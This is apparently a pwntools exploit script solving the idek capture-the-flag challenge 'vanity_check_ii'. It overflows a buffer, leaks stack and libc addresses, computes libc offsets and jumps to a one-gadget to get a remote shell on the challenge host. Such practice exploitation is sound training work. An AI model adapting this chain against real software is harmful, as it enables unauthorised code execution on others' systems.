#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host vanity-check-ii.chal.idek.team --port 1337 vanity_check_ii
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vanity_check_ii')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'vanity-check-ii.chal.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+119
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.send(b'A'*0x20+b'\x30')

io.recvuntil(b'AAAAAAAAAAAAAAAA')
leak = int.from_bytes(io.recvline().rstrip(), 'little')
print('leak:    ', hex(leak))

io.send(b'B'*16 + p64(leak-128))
leak2 = int.from_bytes(io.recvline().rstrip(), 'little')
print('leak: ', hex(leak2))
base = leak2 - 0x111130
system = base +0x055410 
binsh = base + 0x1b75aa
og = base + 0xe6e76
io.send(p64(og))

io.interactive()

